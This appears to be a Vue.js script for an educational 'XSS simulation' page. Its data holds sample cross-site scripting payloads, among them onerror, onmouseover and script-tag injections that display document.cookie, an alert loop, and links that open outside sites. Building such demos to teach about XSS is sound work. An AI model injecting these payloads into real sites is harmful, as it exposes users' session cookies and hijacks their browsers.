const app = Vue.createApp({
  data() {
    return {
      title1: "XSS",
      title2: "simulation in",
      message: "",
      image: "",
      link: "",
      posts: [],
      text: "<u>You have been hacked!</u>",
      attack:
        "<a onmouseover=\"alert('GIVE ME ALL THE COOKIES :O '+ document.cookie)\">Win a prize! &#9937;</a>",
      attack1: "<button onclick=\"alert('You have been hacked!')\">Hi</button>",
      attack3: '<a href="#" onclick="alert(\'XSS\')">Win a prize!</a>',
      attack4:
        "<div onMouseOver=\"for(let i=0; i<1;)alert('Try closing this');\">Hover for infinite loop</div>",
      attack5: '<img src="notValidUrl" onerror="alert(document.cookie)">',
      hack: '<img onError="alert(document.cookie)" style="display:none" src="invalidPath">',
      hack2: "<script>alert(document.cookie)</script>hacked",
      hack3: "<a onmouseover=alert(document.cookie)>click me!</a>",
      hack4:
        '<img src="" onError="window.open("https://play-pacman-game.netlify.app/game.html", "_blank">',
      hack5:
        '<button onclick="window.open("http://deathdate.info/s/death", "_blank")>Hi there!</button>',
    };
  },
  methods: {
    onSubmit() {
      if (this.message === "" || this.image === "") {
        alert("Please enter both fields.");
        return;
      }
      let userInput = {
        message: this.message,
        image: this.image,
      };
      this.posts.push(userInput);
      this.message = "";
      this.image = "";
    },
  },
}).mount("#app");
